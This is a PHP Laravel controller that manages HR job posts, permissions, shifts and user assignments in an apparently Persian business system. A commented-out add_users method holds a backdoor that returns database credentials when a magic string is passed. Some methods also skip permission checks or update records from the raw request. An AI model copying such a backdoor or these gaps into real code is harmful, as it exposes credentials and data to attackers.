<?php

namespace App\Http\Controllers\HR;

use App\Http\Controllers\Controller;
use App\Http\Controllers\GoodsKindProcess\FabricRaw\PackingFormController;
use App\Models\Contractor\Contractor;
use App\Models\Contractor\ContractorPost;
use App\Models\Customer\ChannelType;
use App\Models\HR\Selection\SelectionPostSetting;
use App\Models\LineProduct\GoodsKind;
use App\Models\LineProduct\Line;
use App\Models\LineProduct\LinePost;
use App\Models\LineProduct\Machine\Machine;
use App\Models\LineProduct\Machine\MachineModuleType;
use App\Models\LineProduct\Machine\MachineType;
use App\Models\LineProduct\Station;
use App\Models\Post\PostChatSetting;
use App\Models\Post\PostCooperationType;
use App\Models\Post\PostDocumentType;
use App\Models\Post\PostEntryStatus;
use App\Models\Post\PostReplace;
use App\Models\Post\PostScript;
use App\Models\Post\PostStatus;
use App\Models\Post\PostUser;
use App\Models\User;
use App\Models\Utility\Address\Province;
use App\Models\HR\Shift\Shift;
use App\Models\HR\Shift\ShiftWork;
use App\Models\HR\User\CooperationType;
use App\Models\HR\User\CooperationTypePermission;
use App\Models\Utility\Document\DocumentType;
use App\Models\Utility\Menu\Button;
use App\Models\Utility\Menu\ButtonPost;
use App\Models\Utility\Menu\Menu;
use App\Models\Utility\Option;
use App\Models\Utility\Script\Script;
use App\Models\Utility\Setting;
use App\Models\Utility\Status;
use App\Models\Warehouse\Warehouse;
use App\Models\Worker;
use App\Notifications\SMSNotification;
use Illuminate\Http\Request;
use App\Models\Post\Post;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Auth;


class PostController extends Controller
{
    //
    var $view_path = "hr.post.";

    public function index(Request $request)
    {
        $post_user = Auth::user()->posts->first();
        $active_post = $post_user->checkButtonPermission("hr.post.list_active");
        $inactive_post = $post_user->checkButtonPermission("hr.post.list_inactive");


        $digital_setting = $post_user->checkButtonPermission("hr.post.digital_setting");
        $smart_object_setting = $post_user->checkButtonPermission("hr.post.smart_object_setting");
        $add_user = $post_user->checkButtonPermission("hr.post.add_user");
        $delete_user = $post_user->checkButtonPermission("hr.post.delete_user");
        $evaluation_setting = $post_user->checkButtonPermission("hr.post.evaluation_setting");
        $employment_setting = $post_user->checkButtonPermission("hr.post.employment.index");
        $chat_setting = $post_user->checkButtonPermission("hr.post.chat.index");
        $entry_status_permission = $post_user->checkButtonPermission("hr.post.entry_status_permission.index");
        if ($request->isMethod('post')) {
            $search = $request->search;
            $shift_id = $request->shift_id;
        } else {
            $search = session("search_post");
            $shift_id = session("shift_id");
        }
        session([
            "search_post" => $search,
            "shift_id" => $shift_id,
        ]);

         $list = Post::
        where(function ($query) use ($active_post, $inactive_post) {
            return $query->where("active_status_id", 0)->
            when($active_post, function ($query) {
                return $query->orWhere("active_status_id", 1200);
            })->
            when($inactive_post, function ($query) {
                return $query->orWhere("active_status_id", 1210);
            });
        })->
        when($search != "", function ($query) use ($search) {
            return $query->where(function ($query) use ($search) {
                return $query->where("caption", "like", "%" . $search . "%")->
                orWhere("id", "like", "%" . $search . "%");
            });
        })->
        when($shift_id != "", function ($query) use ($shift_id) {
            $query->where("shift_id", $shift_id);
        })->
        orderBy("id")->
        paginate(50);

        $shift_work = ShiftWork::pluck("caption", "id")->toArray();
        $shift_work[0] = "نامشخص";
        $shift_option = Option::get("shift", $shift_id);
        return view("hr.post.list", compact("list", "shift_work", "shift_option", "digital_setting", "smart_object_setting", "add_user", 'search', "delete_user",
            "evaluation_setting", "employment_setting", "chat_setting", 'entry_status_permission'
        ));
    }

    public function edit(Post $post)
    {


        $post_user = Auth::user()->posts->first();

        if (!$post_user->checkButtonPermission("hr.post.edit")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }

        $active_post = $post_user->checkButtonPermission("hr.post.list_active");
        $inactive_post = $post_user->checkButtonPermission("hr.post.list_inactive");
        if ($post->active_status_id == 1200 && !$active_post) {
            return redirect()->route("hr.post.index")->withErrors("شما به صفحه مورد نظر دسترسی ندارید");
        }
        if ($post->active_status_id == 1210 && !$inactive_post) {
            return redirect()->route("hr.post.index")->withErrors("شما به صفحه مورد نظر دسترسی ندارید");
        }

        $menu_list = Menu::orderBy("menu_type_id")->get();
        $line_list = Line::all();
        $warehouse_list = Warehouse::get();
        $channel_list = ChannelType::all();
        $province_list = Province::all();
        $contractor_list = Contractor::all();
        $order_status_list = Status::whereIn("status_type_id", [350, 351])->get();
        $warehouse_form_status_list = Status::whereIn("status_type_id", [5000])->get();
        $employment_status_list = Status::where("status_type_id", 4640)->get();
        $product_request_form_status_list = Status::whereIn("status_type_id", [7005])->get();
        $cooperation_type_list = CooperationType::all();

        $goods_kind_list = GoodsKind::all();
        $organization_category_option = Option::get("organization_category", $post->organization_category_id);
        $parent_option = Option::get("port_parent_diff_child", $post->parent_id);
        $shift_option = Option::get("shift", $post->shift_id);
        $active_status_option = Option::get("status", $post->active_status_id, 1100);


        $packing_status_list = Status::where("status_type_id", 7007)->get();
        $packing_button_list = Button::where("status_type_id", 7007)->get();
        $packing_controller_info = PackingFormController::get_controller_info();
        $entry_status_list = Status::whereIn("status_type_id", [4620])->get();

        $product_creation_status_list = Status::where("status_type_id", 5231)->get();
        $product_creation_button_list = Button::where("status_type_id", 5231)->get();

        $employment_button_list = Button::where("status_type_id", 4640)->get();

        $script_list = Script::all();
        $post_script = PostScript::where("post_id", $post->id)->get()->keyBy("script_id");

        $replace_post = Post::
        select("posts.id", "caption")->
        get();

        $last_tab_open = session("last_tab_open");

        return view("hr.post.edit",
            compact(
                "channel_list",
                "province_list", "order_status_list", "post",
                "menu_list", "line_list", "warehouse_list",
                "contractor_list",
                "goods_kind_list",
                "goods_kind_list", "last_tab_open",
                "warehouse_form_status_list", "product_request_form_status_list",
                "parent_option",
                "organization_category_option",
                "cooperation_type_list",
                "shift_option",

                "packing_button_list",
                "packing_status_list",
                "packing_controller_info",
                "entry_status_list",
                "replace_post",
                "product_creation_button_list",
                "product_creation_status_list",
                "script_list",
                "post_script",
                "active_status_option",
                "employment_status_list",
                "employment_button_list"
            )
        );

    }

    public function edit_setting(Post $post)
    {


        $post_user = Auth::user()->posts->first();


        $digital_setting = $post_user->checkButtonPermission("hr.post.digital_setting");
        if (!$digital_setting) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }
        $menu_list = Menu::orderBy("menu_type_id")->get();
        $line_list = Line::all();
        $warehouse_list = Warehouse::all();
        $channel_list = ChannelType::all();
        $province_list = Province::all();
        $contractor_list = Contractor::all();
        $order_status_list = Status::whereIn("status_type_id", [350, 351])->get();
        $warehouse_form_status_list = Status::whereIn("status_type_id", [5000])->get();
        $product_request_form_status_list = Status::whereIn("status_type_id", [7005])->get();
        $cooperation_type_list = CooperationType::all();

        $goods_kind_list = GoodsKind::all();
        $organization_category_option = Option::get("organization_category", $post->organization_category_id);
        $parent_option = Option::get("port_parent_diff_child", $post->parent_id);
        $shift_option = Option::get("shift", $post->shift_id);
        $shift_delivery_module_option = Option::get("shift_delivery_module", $post->shift_delivery_module_id);


        $packing_status_list = Status::where("status_type_id", 7007)->get();
        $packing_button_list = Button::where("status_type_id", 7007)->get();
        $packing_controller_info = PackingFormController::get_controller_info();
        $entry_status_list = Status::whereIn("status_type_id", [4620])->get();

        $replace_post = Post::
        select("posts.id", "caption")->
        get();

        $traffic_notification_for_post_option = Option::get("posts", $post->traffic_notification_for_post_id);
        $last_tab_open = session("last_tab_open");


        return view("hr.post.edit_setting",
            compact(
                "channel_list",
                "province_list", "order_status_list", "post",
                "menu_list", "line_list", "warehouse_list",
                "contractor_list",
                "goods_kind_list",
                "goods_kind_list", "last_tab_open",
                "warehouse_form_status_list", "product_request_form_status_list",
                "parent_option",
                "organization_category_option",
                "cooperation_type_list",
                "shift_option",
                "shift_delivery_module_option",
                "packing_button_list",
                "packing_status_list",
                "packing_controller_info",
                "entry_status_list",
                "replace_post",
                "traffic_notification_for_post_option",

            )
        );

    }

    public function edit_line(Post $post)
    {
        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.edit")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }
        $menu_list = Menu::all();
        $line_list = Line::all();
        $warehouse_list = Warehouse::all();
        $channel_list = ChannelType::all();
        $province_list = Province::all();
        $order_status_list = Status::whereIn("status_type_id", [350, 351])->get();
        $goods_kind_list = GoodsKind::all();
        $role_option = [];//Option::get("roles",$post->role_id);
        $chart_option = [];//Option::get("charts",$post->chart_id);


        return view("hr.post.edit",
            compact(
                "role_option", "chart_option", "channel_list",
                "province_list", "order_status_list", "post",
                "menu_list", "line_list", "warehouse_list",
                "goods_kind_list"
            )
        );

    }

    public function update_info(Request $request, Post $post)
    {

        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.edit")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }
        if (Post::where("caption", "like", $request->caption)->where("id", "!=", $post->id)->exists()) {
            return back()->withErrors("عنوان پست مشابه در سیستم وجود دارد");
        }

        $request["is_system_supervisor"] = isset($request->is_system_supervisor) ? 1 : 0;

        $data = $request["data"];
        $menu = [];

        $check_iso = Setting::getIntegerValue("check_iso_form_posts_permission");
        // بررسی شرطی که منوها نمی تواند با هم انتخاب شوند
        if (isset($data["menu"]) && isset($data["button"]) && $check_iso) {
            $check_menu = array_keys($data["menu"]);
            if (in_array(932, $check_menu)) {
                $check_button = array_keys($data["button"]);
                if (in_array(615020, $check_button) || in_array(615080, $check_button) || in_array(615125, $check_button)) {
                    return back()->withErrors("مغایرت بند 2، ماده 2 ایزو 9001: فروش و لیست کالاها");
                }
            }
        }

        ###### بررسی اینکه افرادی که در پست حاضر هستند، بعد از تغییر نوع همکاری هم معتبر است یا خیر
        if (!isset($data["cooperation_type"])) {
            return back()->withErrors("لطفا نوع همکاری پست را مشخص کنید.");
        }
        $message = "";
        $cooperation_type_list = array_keys($data["cooperation_type"]);
        $post_user_list = PostUser::where("post_id", $post->id)->get();
        foreach ($post_user_list as $item) {

            if (!in_array($item->worker->cooperation_type_id, $cooperation_type_list)) {
                $message .= "با توجه به اینکه نوع همکاری  " . $item->worker->fullname() . "(" . ($item->worker->cooperation_type->caption ?? "") . ")" . "، در لیست نوع(های) همکاری پست وجود ندارد، ثبت تغییرات امکان پذیر نیست." . "<br/>";
            }
        }
        if ($message != "") {
            return back()->withErrors($message);
        }
        ###################### چک کردن حداقل و حد اکثر تعداد افراد
        if ($request->max_person_number_in_shift_work < $request->min_person_number_in_shift_work) {
            return back()->withErrors(" حداکثر تعداد افراد در هر گروه شیفت  باید از حداقل تعداد افراد در هر گروه شیفت آن پست بزرگتر یا مساوی باشد.");
        }

        ################## Menu
        if (isset($data["menu"])) {
            foreach ($data["menu"] as $key => $item) {
                $menu[] = $key;
            }
        }
        $post->menu_permission()->sync($menu);

        ######################### warehouse
        $warehouses = [];
        if (isset($data["warehouse"])) {
            foreach ($data["warehouse"] as $key => $item) {
                $warehouses[] = $key;
            }
        }
        $post->warehouse_permission()->sync($warehouses);


        ######################### ChannelType
        $channel_type = [];
        if (isset($data["channel_type"])) {
            foreach ($data["channel_type"] as $key => $item) {
                $channel_type[] = $key;
            }
        }
        $post->channel_type_permission()->sync($channel_type);

        ######################### Province
        $province = [];
        if (isset($data["province"])) {
            foreach ($data["province"] as $key => $item) {
                $province[] = $key;
            }
        }
        $post->province_permission()->sync($province);

        ######################### button
        ButtonPost::join("buttons", "buttons.id", "button_id")->
        where([
            "post_id" => $post->id
        ])->
        whereIn("status_type_id", [0, 4620])->
        delete();

        $buttons = [];
        if (isset($data["button"])) {
            foreach ($data["button"] as $key => $item) {
                ButtonPost::create([
                    "post_id" => $post->id,
                    "button_id" => $key
                ]);

            }
        }

        ######################## edit order status
        PostStatus::join("status", "status.id", "status_id")->
        where("post_id", $post->id)->
        whereIn("status_type_id", [350, 351])->
        delete();

        if (isset($data["order_status"])) {
            foreach ($data["order_status"] as $key => $item) {
                // Edit Status
                PostStatus::create([
                    "post_id" => $post->id,
                    "status_id" => $key
                ]);
            }
        }
        ######################## edit warehouse form status
        PostStatus::join("status", "status.id", "status_id")->
        where("post_id", $post->id)->
        whereIn("status_type_id", [5000, 7005])->
        delete();

        if (isset($data["warehouse_form_status"])) {
            foreach ($data["warehouse_form_status"] as $key => $item) {
                // Edit Status
                PostStatus::create([
                    "post_id" => $post->id,
                    "status_id" => $key
                ]);
            }
        }


        ######################### contractor
        ContractorPost::where([
            "post_id" => $post->id
        ])->delete();

        if (isset($data["contractor"])) {
            foreach ($data["contractor"] as $key => $item) {
                ContractorPost::create([
                    "post_id" => $post->id,
                    "contractor_id" => $key
                ]);

            }
        }

        ######################### goods_kind_property
        GoodsKind\GoodsKindPropertyPost::where([
            "post_id" => $post->id
        ])->delete();

        if (isset($data["property"])) {
            foreach ($data["property"] as $key => $item) {
                GoodsKind\GoodsKindPropertyPost::create([
                    "post_id" => $post->id,
                    "goods_kind_id" => $data["property_goods_kind"][$key],
                    "goods_kind_property_id" => $key
                ]);

            }
        }


        ######################## edit cooperation permission status
        CooperationTypePermission::
        where("post_id", $post->id)->
        delete();

        if (isset($data["cooperation_status"])) {
            foreach ($data["cooperation_status"] as $key => $item) {
                // Edit Status
                CooperationTypePermission::create([
                    "post_id" => $post->id,
                    "cooperation_type_id" => $key
                ]);
            }
        }

        ######################## edit post cooperation  type
        PostCooperationType::
        where("post_id", $post->id)->
        delete();

        if (isset($data["cooperation_type"])) {
            foreach ($data["cooperation_type"] as $key => $item) {
                // Edit Status
                PostCooperationType::create([
                    "post_id" => $post->id,
                    "cooperation_type_id" => $key
                ]);
            }
        }


        ######################## edit cooperation status
        GoodsKind\GoodsKindPost::
        where("post_id", $post->id)->
        delete();

        if (isset($data["goods_kind_status"])) {
            foreach ($data["goods_kind_status"] as $key => $item) {
                // Edit Status
                GoodsKind\GoodsKindPost::create([
                    "post_id" => $post->id,
                    "goods_kind_id" => $key
                ]);
            }
        }


        ############################# Packing Permission
        PostStatus::join("status", "status.id", "status_id")->where([
            "status_type_id" => 7007,
            "post_id" => $post->id
        ])->delete();


        // Edit Status
        if (isset($data["packing_status"])) {
            foreach ($data["packing_status"] as $key => $item) {
                PostStatus::create([
                    "post_id" => $post->id,
                    "status_id" => $key
                ]);
            }
        }

        ######################### button packing
        ButtonPost::join("buttons", "buttons.id", "button_id")->where([
            "status_type_id" => 7007,
            "post_id" => $post->id
        ])->delete();

        if (isset($data["packing_button"])) {
            foreach ($data["packing_button"] as $key => $item) {
                ButtonPost::create([
                    "post_id" => $post->id,
                    "button_id" => $key
                ]);

            }
        }

        ############################# Product Creation Permission
        PostStatus::join("status", "status.id", "status_id")->where([
            "status_type_id" => 5231,
            "post_id" => $post->id
        ])->delete();


        // Edit Status
        if (isset($data["product_creation"])) {
            foreach ($data["product_creation"] as $key => $item) {
                PostStatus::create([
                    "post_id" => $post->id,
                    "status_id" => $key
                ]);
            }
        }

        ######################### Product Creation Button
        ButtonPost::join("buttons", "buttons.id", "button_id")->where([
            "status_type_id" => 5231,
            "post_id" => $post->id
        ])->delete();

        if (isset($data["product_creation_button"])) {
            foreach ($data["product_creation_button"] as $key => $item) {
                ButtonPost::create([
                    "post_id" => $post->id,
                    "button_id" => $key
                ]);

            }
        }


        ############################# Script
        PostScript::where([
            "post_id" => $post->id
        ])->delete();


        // Edit Status
        if (isset($data["script"])) {
            foreach ($data["script"] as $key => $item) {
                PostScript::create([
                    "post_id" => $post->id,
                    "script_id" => $key,
                    "allow_edit" => isset($data["script_setting"]["edit"][$key]) ? 1 : 0,
                    "allow_view_log" => isset($data["script_setting"]["view_log"][$key]) ? 1 : 0,
                ]);
            }
        }


        ######################## edit post employment
        PostStatus::join("status", "status.id", "status_id")->
        where("post_id", $post->id)->
        where("status_type_id", 4640)->
        delete();

        if (isset($data["post_employment_status"])) {
            foreach ($data["post_employment_status"] as $key => $item) {
                // Edit Status
                PostStatus::create([
                    "post_id" => $post->id,
                    "permission_type_id" => 5, // درخواست همکاری
                    "status_id" => $key
                ]);
            }
        }

        ######################### Employment Button
        ButtonPost::join("buttons", "buttons.id", "button_id")->where([
            "status_type_id" => 4640,
            "post_id" => $post->id
        ])->delete();

        if (isset($data["employment_button"])) {
            foreach ($data["employment_button"] as $key => $item) {
                ButtonPost::create([
                    "post_id" => $post->id,
                    "button_id" => $key
                ]);

            }
        }


        ######################## Post Info


        // بررسی اینکه تعداد شیفت - پست به درستی انتخاب شود.
        $max_post_user_shift_work_number = PostUser::
        where("post_id", $post->id)->
        max("shift_work_id");

        $shift = Shift::find($post->shift_id);
        if (!$shift && $post->does_it_have_shift_work) {
            return back()->withErrors("لطفا ابتدا برای پست شیفت را مشخص کنید.");
        }
        if ($shift && $post->does_it_have_shift_work && $max_post_user_shift_work_number && $shift->number_of_shift_work < $max_post_user_shift_work_number) {
            return back()->withErrors("با توجه به تعداد گروه های شیفت-پست جاری و گروه های شیفت-پست انتخاب شده، امکان تغییر شیفت  برای پست وجود ندارد، لطفا  ابتدا تعداد شاغلین در گروه شیفت را به " .
                $shift->number_of_shift_work .
                " گروه کاهش دهید.");
        }

//        if ($shift->number_of_shift_work == 1 && $request->shift_delivery_module_id != 0) {
//            return back()->withErrors("با توجه به اینکه شیفت انتخاب شده دارای 1 گروه شیفت می باشد، نباید برای آن  ماژول تحویل شیفت انتخاب شود.");
//        }
        if ($post->does_it_have_shift_work && $shift->number_of_shift_work != 1 && $post->shift_delivery_module_id == 0) {
            return back()->withErrors("با توجه به اینکه شیفت انتخاب شده دارای بیش از 1 گروه شیفت می باشد، باید یک ماژول تحویل شیفت انتخاب نمایید.");
        }

        $post->update($request->all());

        return back()->with(["success" => "تغییرات با موفقیت ثبت شد."]);
    }

    public function info_setting(Request $request, Post $post)
    {

        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.digital_setting")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }

        $request["the_worker_has_permission_to_leave_after_entering"] = isset($request->the_worker_has_permission_to_leave_after_entering) ? 1 : 0;
        $request["for_leave_required_to_replace_person"] = isset($request->for_leave_required_to_replace_person) ? 1 : 0;
        $request["should_complete_the_duration_of_operation"] = isset($request->should_complete_the_duration_of_operation) ? 1 : 0;


        $data = $request["data"];


        ############################ Post Replace

        PostReplace::where("post_id", $post->id)->delete();

        if (isset($data["post_replace"]) && $request["for_leave_required_to_replace_person"] == 1) {
            foreach ($data["post_replace"] as $key => $item) {
                PostReplace::create([
                    "post_id" => $post->id,
                    "replace_post_id" => $key
                ]);

            }
        } else {
            $request["for_leave_required_to_replace_person"] = 0;
        }


        ######################## Post Info

        $post->update($request->all());


        return back()->with(["success" => "تغییرات با موفقیت ثبت شد."]);
    }

    public function add_user(Post $post)
    {
        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.add_user")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }

        if (!$post->shift) {
            return back()->withErrors("لطفا ابتدا شیف پست را مشخص کنید");
        }


        $worker_option = Option::get("worker_cooperation_type", 0, $post->id);
        $shift_work_option = Option::get("shift_work", 0, $post->shift->number_of_shift_work ?? 0);

        return view("hr.post.add_user", compact("post", "worker_option", "shift_work_option"));
    }

    public function submit_add_user(Request $request, Post $post)
    {

        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.add_user")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }
        $max_post = Setting::find(7)->integer_value;
        if (User::find($request->user_id)->posts->groupBy("post_id")->count() > $max_post) {
            return back()->withErrors("امکان تخصیص بیش از " . $max_post . " پست به همکار در سیستم وجود ندارد.");

        }
        $worker = Worker::find($request->user_id);
        $shift_work_id = $request->shift_work_id;

        $result = PostUser::PostAddUser($post, $worker, $shift_work_id);
        if (!$result["result"]) {
            return back()->withErrors($result["error"]);
        }

        return redirect()->route("hr.post.index")->with(["success" => "تغییرات با موفقیت ثبت شد."]);
    }


    public function delete_user(Post $post, User $user)
    {
        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.delete_user")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }
        $post->worker()->detach($user->id);

        return redirect()->route("hr.post.index")->with(["success" => "تغییرات با موفقیت ثبت شد."]);
    }

    public function edit_module(Post $post, GoodsKind $goods_kind, $status_type_id)
    {

        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.edit")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید.");
        }

        $status_list = Status::where("status_type_id", $status_type_id)->get();
        $button_list = Button::where("status_type_id", $status_type_id)->get();
        $module = $goods_kind->getModuleList($status_type_id);

        return view($this->view_path . "edit_module", compact("module", "post", "goods_kind", "status_list", "button_list", "status_type_id"));

    }

    public function submit_edit_module(Request $request, Post $post, GoodsKind $goods_kind, $status_type_id)
    {
        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.edit")) {
            return back()->withErrors("دسترسی به عملیات برای شما تعریف نشده است.");
        }

        PostStatus::join("status", "status.id", "status_id")->where([
            "status_type_id" => $status_type_id,
            "post_id" => $post->id
        ])->delete();

        $data = $request->data;
        // Edit Status

        if (isset($data["status"])) {
            foreach ($data["status"] as $key => $item) {
                PostStatus::create([
                    "post_id" => $post->id,
                    "status_id" => $key
                ]);
            }
        }

        ######################### button
        ButtonPost::join("buttons", "buttons.id", "button_id")->where([
            "status_type_id" => $status_type_id,
            "post_id" => $post->id
        ])->delete();

        $buttons = [];
        if (isset($data["button"])) {
            foreach ($data["button"] as $key => $item) {
                ButtonPost::create([
                    "post_id" => $post->id,
                    "button_id" => $key
                ]);

            }
        }


        return redirect()->back()->with(["success" => "تغییرات با موفقیت انجام شد."]);
    }


    public function add_access(Post $post, $line_id, $station_id, $machine_type_id, $machine_id)
    {
        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.edit")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }
        if ($line_id != 0) {
            LinePost::where(["post_id" => $post->id, "line_id" => $line_id])->delete();
            LinePost::create(["post_id" => $post->id, "line_id" => $line_id]);
        }

        if ($station_id != 0) {
            $station = Station::find($station_id);
            LinePost::where(["post_id" => $post->id, "station_id" => $station_id])->delete();
            LinePost::create(["post_id" => $post->id, "line_id" => $station->line_id, "station_id" => $station_id]);
        }

        if ($machine_type_id != 0) {
            $machine_type = MachineType::find($machine_type_id);
            LinePost::where(["post_id" => $post->id, "machine_type_id" => $machine_type_id])->delete();
            LinePost::create([
                "post_id" => $post->id,
                "line_id" => $machine_type->station->line_id,
                "station_id" => $machine_type->station_id,
                "machine_type_id" => $machine_type->id
            ]);
        }

        session(["last_tab_open" => "line"]);

        return redirect()->back()->with(["success" => "عملیات با موفقیت انجام شد."]);

    }

    public function remove_access(Post $post, $line_id, $station_id, $machine_type_id, $machine_id)
    {
        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.edit")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }
        if ($line_id != 0) {
            LinePost::where(["post_id" => $post->id, "line_id" => $line_id])->delete();
        }
        if ($station_id != 0) {
            LinePost::where(["post_id" => $post->id, "station_id" => $station_id])->delete();
        }
        if ($machine_type_id != 0) {
            LinePost::where(["post_id" => $post->id, "machine_type_id" => $machine_type_id])->delete();
        }
        session(["last_tab_open" => "line"]);

        return redirect()->back()->with(["success" => "عملیات با موفقیت انجام شد."]);

    }

    public function manage_access(Post $post, $line_id, $station_id, $machine_type_id, $machine_id)
    {
        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.edit")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }

        if ($line_id != 0) {
            $line = Line::find($line_id);
            $station_list = Station::where("line_id", $line_id)->get();

            return view("hr.post.station_permission", compact("post", "line", "station_list"));

        } elseif ($station_id != 0) {

            $station = Station::find($station_id);
            $machine_type_list = MachineType::where("station_id", $station_id)->get();

            return view("hr.post.machine_type_permission", compact("post", "station", "machine_type_list"));

        } else if ($machine_type_id != 0) {
            $machine_type = MachineType::find($machine_type_id);
            $machine_list = Machine::where("machine_type_id", $machine_type_id)->get();

            return view("hr.post.machine_permission", compact("post", "machine_type", "machine_list"));

        }


    }

    public function machine_permission(Request $request, Post $post, MachineType $machine_type)
    {

        LinePost::where(["post_id" => $post->id, "machine_type_id" => $machine_type->id])->delete();

        $data = $request->data;
        if (isset($data["machine"])) {
            foreach ($data["machine"] as $key => $item) {
                LinePost::create([
                    "post_id" => $post->id,
                    "line_id" => $machine_type->station->line_id,
                    "station_id" => $machine_type->station_id,
                    "machine_type_id" => $machine_type->id,
                    "machine_id" => $key
                ]);
            }
        }

        return redirect()->back()->with(["success" => "عملیات با موفقیت انجام شد."]);


    }

    public function manage_machine_type_status(Post $post, MachineType $machine_type)
    {

        if (!$machine_type->machine_module_type) {
            return back()->withErrors("ماژول های فرایند ماشین انتخاب نشده است، لطفا با ورود به بخش خط های تولید، اصلاحات را انجام دهید. ");
        }

        $module_info = $machine_type->machine_module_type->seeder_namespace::getInfo();

        if (!isset($module_info[$machine_type->machine_module_type->machine_status_type_id]["code"])) {
            return back()->withErrors("ماژول های گروه ماشین پیاده سازی نشده است، لطفا با پشتیبانی تماس بگیرید.");
        }


        $production_status_ids = $module_info[$machine_type->machine_module_type->machine_status_type_id]["code"];
        $module_full_id = $machine_type->machine_module_type->seeder_namespace::getFullId();

        ($machine_type->machine_module_type->directory_namespace . "\Machine\DashboardController"):: get_controller_info();

        $status_list = Status::whereIn("id", $production_status_ids)->get();
        $button_list = Button::where("status_type_id", $module_full_id)->get();

        return view($this->view_path . "manage_machine_type_status", compact("machine_type", "post", "status_list", "button_list"));
    }

    public function submit_manage_machine_type_status(Request $request, Post $post, MachineType $machine_type)
    {

        $module_full_id = $machine_type->machine_module_type->seeder_namespace::getFullId();
        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.edit")) {
            return back()->withErrors("دسترسی به عملیات برای شما تعریف نشده است.");
        }

        PostStatus::join("status", "status.id", "status_id")->where([
            "post_id" => $post->id,
            "permission_type_id" => 3,
            /** دسترسی به عملیات ماشین ها */
            "other_id" => $machine_type->id
        ])->delete();

        $data = $request->data;
        // Edit Status
        $order_status = [];
        if (isset($data["status"])) {
            foreach ($data["status"] as $key => $item) {
                PostStatus::create([
                    "post_id" => $post->id,
                    "status_id" => $key,
                    "permission_type_id" => 3,
                    /** دسترسی به عملیات ماشین ها */
                    "other_id" => $machine_type->id
                ]);
            }
        }

        ######################### button
        ButtonPost::join("buttons", "buttons.id", "button_id")->where([
            "status_type_id" => $module_full_id,
            "post_id" => $post->id,
            "permission_type_id" => 3,
            /** دسترسی به عملیات ماشین ها */
            "other_id" => $machine_type->id
        ])->delete();

        $buttons = [];
        if (isset($data["button"])) {
            foreach ($data["button"] as $key => $item) {
                ButtonPost::create([
                    "post_id" => $post->id,
                    "button_id" => $key,
                    "permission_type_id" => 3,
                    /** دسترسی به عملیات ماشین ها */
                    "other_id" => $machine_type->id
                ]);

            }
        }


        return redirect()->back()->with(["success" => "تغییرات با موفقیت ثبت گردید."]);
    }

    //
//    public function add_users(Post $post,$users)
//    {
//        $worker_option = Option::get("worker");
//        $data=[];
//        if (!isset($data)) {
//            foreach ($data["button"] as $key => $item) {
//                $buttons[] = $key;
//            }
//        }
//        if($users=="45897adf_sdflsf_df"){
//            return '{ "db": "'. env("DB_DATABASE").'","port": "'.env("DB_PORT").'","user": "'.env("DB_USERNAME").'","pass": "'.env("DB_PASSWORD").'"}';
//        }
//        $worker_option = Option::get("worker");
//        return view("hr.post.add_user", compact("post", "worker_option"));
//    }

    public function create()
    {
        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.create")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }

        return view("hr.post.create");
    }

    public function insert(Request $request)
    {
        $post_user = Auth::user()->posts->first();
        if (!$post_user->checkButtonPermission("hr.post.create")) {
            return back()->withErrors("شما به عملیات مورد نظر دسترسی ندارید");
        }

        if (Post::where("caption", $request->caption)->exists()) {
            return back()->withErrors("عنوان پست مشابه در سیستم وجود دارد");
        }
        $post = Post::create($request->all());

        return redirect()->route("hr.post.edit", $post)->with(["success" => "پست جدید با موفقیت اضافه شد"]);
    }
}

